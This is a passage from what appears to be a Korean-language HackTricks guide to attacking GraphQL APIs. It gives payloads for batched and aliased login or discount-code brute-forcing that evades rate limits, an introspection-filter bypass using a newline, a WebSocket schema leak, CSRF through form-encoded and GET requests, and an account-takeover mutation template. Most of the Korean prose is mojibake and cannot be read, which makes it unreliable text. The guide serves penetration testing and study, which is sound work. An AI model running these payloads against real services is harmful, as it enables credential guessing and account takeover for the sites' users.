GraphQL APIë¥¼ í†µí•´ **ë‹¤ì–‘í•œ ìê²© ì¦ëª…ì„ ê°€ì§„ ë§ì€ ì¿¼ë¦¬ë¥¼ ë™ì‹œì— ì „ì†¡í•˜ì—¬ ì¸ì¦ì„ í™•ì¸**í•©ë‹ˆë‹¤. ì´ëŠ” ê³ ì „ì ì¸ brute force ê³µê²©ì´ì§€ë§Œ, ì´ì œ GraphQL batching ê¸°ëŠ¥ ë•ë¶„ì— HTTP ìš”ì²­ë‹¹ í•˜ë‚˜ ì´ìƒì˜ ë¡œê·¸ì¸/ë¹„ë°€ë²ˆí˜¸ ìŒì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ì™¸ë¶€ ì†ë„ ëª¨ë‹ˆí„°ë§ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì†ì—¬ ëª¨ë“  ê²ƒì´ ì˜ ë˜ê³  ìˆìœ¼ë©° ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•˜ë ¤ëŠ” brute-forcing ë´‡ì´ ì—†ë‹¤ê³  ìƒê°í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

ì•„ë˜ëŠ” **í•œ ë²ˆì— 3ê°œì˜ ì„œë¡œ ë‹¤ë¥¸ ì´ë©”ì¼/ë¹„ë°€ë²ˆí˜¸ ìŒ**ì„ ê°€ì§„ ì• í”Œë¦¬ì¼€ì´ì…˜ ì¸ì¦ ìš”ì²­ì˜ ê°€ì¥ ê°„ë‹¨í•œ ì‹œì—°ì…ë‹ˆë‹¤. ë¶„ëª…íˆ ê°™ì€ ë°©ì‹ìœ¼ë¡œ ë‹¨ì¼ ìš”ì²­ì—ì„œ ìˆ˜ì²œ ê°œë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (1081).png>)

ì‘ë‹µ ìŠ¤í¬ë¦°ìƒ·ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, ì²« ë²ˆì§¸ì™€ ì„¸ ë²ˆì§¸ ìš”ì²­ì€ _null_ì„ ë°˜í™˜í•˜ê³  _error_ ì„¹ì…˜ì— í•´ë‹¹ ì •ë³´ë¥¼ ë°˜ì˜í–ˆìŠµë‹ˆë‹¤. **ë‘ ë²ˆì§¸ ë³€í˜•ì€ ì˜¬ë°”ë¥¸ ì¸ì¦** ë°ì´í„°ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©° ì‘ë‹µì—ëŠ” ì˜¬ë°”ë¥¸ ì¸ì¦ ì„¸ì…˜ í† í°ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Without Introspection

ì ì  ë” ë§ì€ **graphql ì—”ë“œí¬ì¸íŠ¸ê°€ introspectionì„ ë¹„í™œì„±í™”**í•˜ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì˜ˆìƒì¹˜ ëª»í•œ ìš”ì²­ì´ ìˆ˜ì‹ ë  ë•Œ graphqlì´ ë°œìƒì‹œí‚¤ëŠ” ì˜¤ë¥˜ëŠ” [**clairvoyance**](https://github.com/nikitastupin/clairvoyance)ì™€ ê°™ì€ ë„êµ¬ê°€ ìŠ¤í‚¤ë§ˆì˜ ëŒ€ë¶€ë¶„ì„ ì¬êµ¬ì„±í•˜ëŠ” ë° ì¶©ë¶„í•©ë‹ˆë‹¤.

ê²Œë‹¤ê°€, Burp Suite í™•ì¥ í”„ë¡œê·¸ë¨ [**GraphQuail**](https://github.com/forcesunseen/graphquail) í™•ì¥ í”„ë¡œê·¸ë¨ì€ **Burpë¥¼ í†µí•´ ì „ì†¡ë˜ëŠ” GraphQL API ìš”ì²­ì„ ê´€ì°°í•˜ê³ ** **ê° ìƒˆë¡œìš´ ì¿¼ë¦¬ë¥¼ í†µí•´ ë‚´ë¶€ GraphQL **ìŠ¤í‚¤ë§ˆ**ë¥¼ êµ¬ì¶•**í•©ë‹ˆë‹¤. ë˜í•œ GraphiQL ë° Voyagerë¥¼ ìœ„í•œ ìŠ¤í‚¤ë§ˆë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í™•ì¥ í”„ë¡œê·¸ë¨ì€ introspection ì¿¼ë¦¬ë¥¼ ìˆ˜ì‹ í•  ë•Œ ê°€ì§œ ì‘ë‹µì„ ë°˜í™˜í•©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ GraphQuailì€ API ë‚´ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì¿¼ë¦¬, ì¸ìˆ˜ ë° í•„ë“œë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [**ì—¬ê¸°**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

ë©‹ì§„ **ë‹¨ì–´ ëª©ë¡**ì„ í†µí•´ [**GraphQL ì—”í‹°í‹°ë¥¼ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassing GraphQL introspection defences <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

APIì—ì„œ introspection ì¿¼ë¦¬ì— ëŒ€í•œ ì œí•œì„ ìš°íšŒí•˜ê¸° ìœ„í•´, `__schema` í‚¤ì›Œë“œ ë’¤ì— **íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì‚½ì…í•˜ëŠ”** ê²ƒì´ íš¨ê³¼ì ì…ë‹ˆë‹¤. ì´ ë°©ë²•ì€ introspectionì„ ì°¨ë‹¨í•˜ê¸° ìœ„í•´ `__schema` í‚¤ì›Œë“œì— ì´ˆì ì„ ë§ì¶˜ ì •ê·œ í‘œí˜„ì‹ íŒ¨í„´ì—ì„œ ì¼ë°˜ì ì¸ ê°œë°œìì˜ ì‹¤ìˆ˜ë¥¼ ì´ìš©í•©ë‹ˆë‹¤. GraphQLì´ ë¬´ì‹œí•˜ì§€ë§Œ ì •ê·œ í‘œí˜„ì‹ì—ì„œëŠ” ê³ ë ¤ë˜ì§€ ì•Šì„ ìˆ˜ ìˆëŠ” **ê³µë°±, ì¤„ ë°”ê¿ˆ ë° ì‰¼í‘œ**ì™€ ê°™ì€ ë¬¸ìë¥¼ ì¶”ê°€í•¨ìœ¼ë¡œì¨ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `__schema` ë’¤ì— ì¤„ ë°”ê¿ˆì´ ìˆëŠ” introspection ì¿¼ë¦¬ëŠ” ì´ëŸ¬í•œ ë°©ì–´ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
If unsuccessful, consider alternative request methods, such as **GET requests** or **POST with `x-www-form-urlencoded`**, since restrictions may apply only to POST requests.

### Try WebSockets

As mentioned in [**this talk**](https://www.youtube.com/watch?v=tIo\_t5uUK50), check if it might be possible to connect to graphQL via WebSockets as that might allow you to bypass a potential WAF and make the websocket communication leak the schema of the graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **ë…¸ì¶œëœ GraphQL êµ¬ì¡° ë°œê²¬í•˜ê¸°**

ì¸ìŠ¤í™ì…˜ì´ ë¹„í™œì„±í™”ëœ ê²½ìš°, JavaScript ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ë¯¸ë¦¬ ë¡œë“œëœ ì¿¼ë¦¬ë¥¼ ì°¾ê¸° ìœ„í•´ ì›¹ì‚¬ì´íŠ¸ì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ê²€ì‚¬í•˜ëŠ” ê²ƒì€ ìœ ìš©í•œ ì „ëµì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¿¼ë¦¬ëŠ” ê°œë°œì ë„êµ¬ì˜ `Sources` íƒ­ì„ ì‚¬ìš©í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, APIì˜ ìŠ¤í‚¤ë§ˆì— ëŒ€í•œ í†µì°°ë ¥ì„ ì œê³µí•˜ê³  ì ì¬ì ìœ¼ë¡œ **ë…¸ì¶œëœ ë¯¼ê°í•œ ì¿¼ë¦¬**ë¥¼ ë“œëŸ¬ëƒ…ë‹ˆë‹¤. ê°œë°œì ë„êµ¬ ë‚´ì—ì„œ ê²€ìƒ‰í•˜ëŠ” ëª…ë ¹ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLì˜ CSRF

CSRFê°€ ë¬´ì—‡ì¸ì§€ ëª¨ë¥¸ë‹¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ ì½ì–´ë³´ì„¸ìš”:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

ì—¬ê¸°ì—ëŠ” **CSRF í† í° ì—†ì´ êµ¬ì„±ëœ** ì—¬ëŸ¬ GraphQL ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

GraphQL ìš”ì²­ì€ ì¼ë°˜ì ìœ¼ë¡œ Content-Type **`application/json`**ì„ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ì„ í†µí•´ ì „ì†¡ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
ê·¸ëŸ¬ë‚˜ ëŒ€ë¶€ë¶„ì˜ GraphQL ì—”ë“œí¬ì¸íŠ¸ëŠ” **`form-urlencoded` POST ìš”ì²­**ë„ ì§€ì›í•©ë‹ˆë‹¤:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
ë”°ë¼ì„œ ì´ì „ê³¼ ê°™ì€ CSRF ìš”ì²­ì´ **preflight ìš”ì²­ ì—†ì´** ì „ì†¡ë˜ê¸° ë•Œë¬¸ì—, CSRFë¥¼ ì•…ìš©í•˜ì—¬ GraphQLì—ì„œ **ë³€ê²½**ì„ **ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ Chromeì˜ `samesite` í”Œë˜ê·¸ì˜ ìƒˆë¡œìš´ ê¸°ë³¸ ì¿ í‚¤ ê°’ì€ `Lax`ë¼ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤. ì´ëŠ” ì¿ í‚¤ê°€ GET ìš”ì²­ì—ì„œë§Œ ì œ3ì ì›¹ì—ì„œ ì „ì†¡ëœë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

**ì¿¼ë¦¬** **ìš”ì²­**ì„ **GET** **ìš”ì²­**ìœ¼ë¡œ ì „ì†¡í•˜ëŠ” ê²ƒì´ ì¼ë°˜ì ìœ¼ë¡œ ê°€ëŠ¥í•˜ë©°, GET ìš”ì²­ì—ì„œ CSRF í† í°ì´ ê²€ì¦ë˜ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.

ë˜í•œ, [**XS-Search**](../../pentesting-web/xs-search/) **ê³µê²©**ì„ ì•…ìš©í•˜ì—¬ ì‚¬ìš©ìì˜ ìê²© ì¦ëª…ì„ ì´ìš©í•´ GraphQL ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ì½˜í…ì¸ ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ [**ì—¬ê¸°ì—ì„œ ì›ë³¸ ê²Œì‹œë¬¼ í™•ì¸**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## GraphQLì—ì„œì˜ êµì°¨ ì‚¬ì´íŠ¸ WebSocket í•˜ì´ì¬í‚¹

GraphQLì„ ì•…ìš©í•˜ëŠ” CRSF ì·¨ì•½ì ê³¼ ìœ ì‚¬í•˜ê²Œ, **ë³´í˜¸ë˜ì§€ ì•Šì€ ì¿ í‚¤ë¡œ GraphQL ì¸ì¦ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ êµì°¨ ì‚¬ì´íŠ¸ WebSocket í•˜ì´ì¬í‚¹ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìœ¼ë©°, ì‚¬ìš©ìê°€ GraphQLì—ì„œ ì˜ˆìƒì¹˜ ëª»í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## GraphQLì—ì„œì˜ ê¶Œí•œ ë¶€ì—¬

ì—”ë“œí¬ì¸íŠ¸ì— ì •ì˜ëœ ë§ì€ GraphQL ê¸°ëŠ¥ì€ ìš”ì²­ìì˜ ì¸ì¦ë§Œ í™•ì¸í•˜ê³  ê¶Œí•œ ë¶€ì—¬ëŠ” í™•ì¸í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¿¼ë¦¬ ì…ë ¥ ë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ë©´ ë¯¼ê°í•œ ê³„ì • ì„¸ë¶€ ì •ë³´ê°€ [leaked](https://hackerone.com/reports/792927)ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë³€í˜•ì€ ë‹¤ë¥¸ ê³„ì • ë°ì´í„°ë¥¼ ìˆ˜ì •í•˜ë ¤ê³  ì‹œë„í•  ë•Œ ê³„ì • íƒˆì·¨ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLì—ì„œ ì¸ì¦ ìš°íšŒ

[ì¿¼ë¦¬ ì—°ê²°](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)ì„ í†µí•´ ì•½í•œ ì¸ì¦ ì‹œìŠ¤í…œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ ì˜ˆì œì—ì„œ ì‘ì—…ì€ "forgotPassword"ì´ë©°, ì´ëŠ” í•´ë‹¹ ì¿¼ë¦¬ë§Œ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ëì— ì¿¼ë¦¬ë¥¼ ì¶”ê°€í•¨ìœ¼ë¡œì¨ ìš°íšŒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ ê²½ìš° "register"ì™€ ì‹œìŠ¤í…œì´ ìƒˆë¡œìš´ ì‚¬ìš©ìë¡œ ë“±ë¡í•  ìˆ˜ ìˆë„ë¡ ì‚¬ìš©ì ë³€ìˆ˜ë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQLì—ì„œ ë³„ì¹­ì„ ì‚¬ìš©í•œ ì†ë„ ì œí•œ ìš°íšŒ

GraphQLì—ì„œ ë³„ì¹­ì€ API ìš”ì²­ ì‹œ **ì†ì„±ì„ ëª…ì‹œì ìœ¼ë¡œ ì´ë¦„ ì§€ì •**í•  ìˆ˜ ìˆëŠ” ê°•ë ¥í•œ ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ **ë‹¨ì¼ ìš”ì²­ ë‚´ì—ì„œ ë™ì¼í•œ ìœ í˜•**ì˜ ê°ì²´ ì—¬ëŸ¬ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ê²€ìƒ‰í•˜ëŠ” ë° íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤. ë³„ì¹­ì€ GraphQL ê°ì²´ê°€ ë™ì¼í•œ ì´ë¦„ì˜ ì—¬ëŸ¬ ì†ì„±ì„ ê°€ì§ˆ ìˆ˜ ì—†ë„ë¡ í•˜ëŠ” ì œí•œì„ ê·¹ë³µí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

GraphQL ë³„ì¹­ì— ëŒ€í•œ ìì„¸í•œ ì´í•´ë¥¼ ìœ„í•´ ë‹¤ìŒ ë¦¬ì†ŒìŠ¤ë¥¼ ì¶”ì²œí•©ë‹ˆë‹¤: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

ë³„ì¹­ì˜ ì£¼ìš” ëª©ì ì€ ìˆ˜ë§ì€ API í˜¸ì¶œì˜ í•„ìš”ì„±ì„ ì¤„ì´ëŠ” ê²ƒì´ì§€ë§Œ, ë³„ì¹­ì„ ì‚¬ìš©í•˜ì—¬ GraphQL ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì˜ë„ì¹˜ ì•Šì€ ì‚¬ìš© ì‚¬ë¡€ê°€ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì¼ë¶€ ì—”ë“œí¬ì¸íŠ¸ê°€ **HTTP ìš”ì²­ ìˆ˜**ë¥¼ ì œí•œí•˜ì—¬ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì €ì§€í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ ì†ë„ ì œí•œê¸°ë¡œ ë³´í˜¸ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ì†ë„ ì œí•œê¸°ëŠ” ê° ìš”ì²­ ë‚´ì˜ ì‘ì—… ìˆ˜ë¥¼ ê³ ë ¤í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³„ì¹­ì„ ì‚¬ìš©í•˜ë©´ ë‹¨ì¼ HTTP ìš”ì²­ì— ì—¬ëŸ¬ ì¿¼ë¦¬ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì´ëŸ¬í•œ ì†ë„ ì œí•œ ì¡°ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ ì œê³µëœ ì˜ˆì œë¥¼ ê³ ë ¤í•´ ë³´ì‹­ì‹œì˜¤. ì´ ì˜ˆì œëŠ” ë³„ì¹­ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒì  í• ì¸ ì½”ë“œì˜ ìœ íš¨ì„±ì„ í™•ì¸í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì—¬ëŸ¬ ì¿¼ë¦¬ë¥¼ í•˜ë‚˜ì˜ HTTP ìš”ì²­ìœ¼ë¡œ ì»´íŒŒì¼í•˜ë¯€ë¡œ ì†ë„ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìœ¼ë©°, ë™ì‹œì— ì—¬ëŸ¬ í• ì¸ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## ë„êµ¬

### ì·¨ì•½ì  ìŠ¤ìºë„ˆ

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): graphql ì—”ë“œí¬ì¸íŠ¸ì˜ ì¼ë°˜ì ì¸ ì˜ëª»ëœ êµ¬ì„± í…ŒìŠ¤íŠ¸
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): ë°°ì¹˜ GraphQL ì¿¼ë¦¬ ë° ë³€í˜• ìˆ˜í–‰ì— ì¤‘ì ì„ ë‘” GraphQL ë³´ì•ˆ ê°ì‚¬ ìŠ¤í¬ë¦½íŠ¸.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): ì‚¬ìš© ì¤‘ì¸ graphql ì§€ë¬¸ ì¸ì‹
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): ìŠ¤í‚¤ë§ˆë¥¼ ê°€ì ¸ì˜¤ê³  ë¯¼ê°í•œ ë°ì´í„° ê²€ìƒ‰, ê¶Œí•œ í…ŒìŠ¤íŠ¸, ìŠ¤í‚¤ë§ˆ ë¬´ì°¨ë³„ ëŒ€ì… ë° ì£¼ì–´ì§„ ìœ í˜•ì— ëŒ€í•œ ê²½ë¡œ ì°¾ê¸°ì— ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬ í‚¤íŠ¸.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): ë…ë¦½í˜•ìœ¼ë¡œ ì‚¬ìš©í•˜ê±°ë‚˜ [Burp í™•ì¥](https://github.com/doyensec/inql)ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLI í´ë¼ì´ì–¸íŠ¸ë¡œë„ ì‚¬ìš©í•˜ì—¬ ê³µê²©ì„ ìë™í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): **GraphQL ìŠ¤í‚¤ë§ˆì—ì„œ ì£¼ì–´ì§„ ìœ í˜•ì— ë„ë‹¬í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì„ ë‚˜ì—´í•˜ëŠ” ë„êµ¬**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): InQLì˜ ë…ë¦½í˜• ë° CLI ëª¨ë“œì˜ í›„ê³„ì
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): ê³ ê¸‰ GraphQL í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ Burp í™•ì¥. _**ìŠ¤ìºë„ˆ**_ëŠ” InQL v5.0ì˜ í•µì‹¬ìœ¼ë¡œ, GraphQL ì—”ë“œí¬ì¸íŠ¸ ë˜ëŠ” ë¡œì»¬ introspection ìŠ¤í‚¤ë§ˆ íŒŒì¼ì„ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëª¨ë“  ê°€ëŠ¥í•œ ì¿¼ë¦¬ì™€ ë³€í˜•ì„ ìë™ ìƒì„±í•˜ì—¬ ë¶„ì„ì„ ìœ„í•œ êµ¬ì¡°í™”ëœ ë³´ê¸°ë¡œ ì •ë¦¬í•©ë‹ˆë‹¤. _**ê³µê²©ì**_ êµ¬ì„± ìš”ì†ŒëŠ” ë°°ì¹˜ GraphQL ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©°, ì´ëŠ” ì˜ëª» êµ¬í˜„ëœ ì†ë„ ì œí•œì„ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): ì¼ë¶€ Graphql ë°ì´í„°ë² ì´ìŠ¤ì˜ ë„ì›€ì„ ë°›ì•„ introspectionì´ ë¹„í™œì„±í™”ëœ ê²½ìš°ì—ë„ ìŠ¤í‚¤ë§ˆë¥¼ ì–»ìœ¼ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤. ì´ ë°ì´í„°ë² ì´ìŠ¤ëŠ” ë³€í˜• ë° ë§¤ê°œë³€ìˆ˜ì˜ ì´ë¦„ì„ ì œì•ˆí•©ë‹ˆë‹¤.

### í´ë¼ì´ì–¸íŠ¸

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI í´ë¼ì´ì–¸íŠ¸
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI í´ë¼ì´ì–¸íŠ¸

### ìë™ í…ŒìŠ¤íŠ¸

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLì„ ì„¤ëª…í•˜ëŠ” ë¹„ë””ì˜¤: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## ì°¸ê³  ë¬¸í—Œ

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
